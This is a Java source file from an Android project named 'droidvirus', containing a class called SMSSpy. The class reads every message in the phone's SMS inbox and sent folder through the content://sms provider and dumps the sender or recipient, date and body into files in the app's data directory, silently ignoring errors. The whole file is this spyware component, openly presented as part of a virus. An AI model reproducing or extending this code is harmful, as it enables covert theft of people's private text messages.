package com.artisanter.droidvirus;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSSpy {
    static void dumpSMS(Context context, String file, String box) {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.US);

        Cursor cursor = context.getContentResolver()
                .query(Uri.parse("content://sms/" + box), null, null, null, null);

        try {
            PrintWriter pw = new PrintWriter(file);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = null;
                    String date = null;
                    String body = null;

                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        switch (cursor.getColumnName(idx)) {
                            case "address":
                                address = cursor.getString(idx);
                                break;
                            case "date":
                                date = cursor.getString(idx);
                                break;
                            case "body":
                                body = cursor.getString(idx);
                        }
                    }

                    if (box.equals("inbox")) {
                        pw.println("From: " + address);
                    } else {
                        pw.println("To: " + address);
                    }

                    String dateString = formatter.format(new Date(Long.valueOf(date)));

                    pw.println("Date: " + dateString);

                    if (body != null) {
                        pw.println("Body: " + body.replace('\n', ' '));
                    } else {
                        pw.println("Body: ");
                    }

                    pw.println();
                } while (cursor.moveToNext());
            }
            pw.close();
            if(cursor != null)
                cursor.close();
        } catch (Exception ignored) {}
    }

    static void writeSMS(Context context){
        String inboxFile = context.getApplicationInfo().dataDir + "/sms_inbox";
        dumpSMS(context, inboxFile, "inbox");

        String sentFile = context.getApplicationInfo().dataDir + "/sms_sent";
        dumpSMS(context, sentFile, "sent");
    }
}
